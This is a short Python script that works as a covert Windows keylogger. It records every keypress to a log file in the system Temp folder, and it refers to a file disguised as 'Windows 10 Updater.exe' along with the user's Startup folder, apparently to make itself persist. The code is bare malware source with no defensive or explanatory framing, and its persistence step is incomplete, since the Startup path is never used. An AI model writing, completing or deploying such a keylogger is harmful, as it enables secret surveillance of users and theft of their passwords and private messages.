import keyboard
import datetime
import shutil
import getpass

def on_key_press(event):
    with open("C:\Windows\Temp\log.txt", "a") as f:
        f.write(f"{event.name}-")
        
def main():
    date = datetime.datetime.now()
    with open("C:\Windows\Temp\log.txt", "a") as f:
        f.write(f"\nDATE - {date}\n")
    while True:
        keyboard.on_press(on_key_press)
        keyboard.wait()

if __name__ == "__main__":
    USER_NAME = getpass.getuser()
    path = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
    try:
        shutil.move('Windows 10 Updater.exe', "C:\Windows\Temp")
    except:
        pass

    main()
